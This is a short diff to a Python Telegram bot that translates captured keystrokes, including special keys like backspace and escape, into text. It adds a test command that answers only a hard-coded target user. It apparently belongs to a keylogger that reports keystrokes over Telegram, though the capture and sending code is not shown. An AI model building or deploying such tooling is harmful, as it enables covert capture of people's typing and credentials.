@@ -56,6 +56,14 @@ def stop(message):
     bot.send_message(chat.id, "Останавливаем сервер")
 
 
+@bot.message_handler(commands=["t"])
+def test_roundtrip(message):
+    chat = getattr(message, "chat", None)
+    if chat is None or str(getattr(chat, "id", "")) != str(TARGET_USER_ID):
+        return
+    bot.send_message(chat.id, "/t")
+
+
 _user32 = None
 _kernel32 = None
 if sys.platform == "win32":
@@ -232,7 +240,7 @@ def _translate_keycode_windows(key_code: keyboard.KeyCode) -> Optional[str]:
 
 _SPECIAL_KEYS = {
     keyboard.Key.enter: "\n",
-    keyboard.Key.backspace: "\b",
+    keyboard.Key.backspace: "{backspace}",
     keyboard.Key.tab: "\t",
     keyboard.Key.space: " ",
     keyboard.Key.esc: "{esc}",
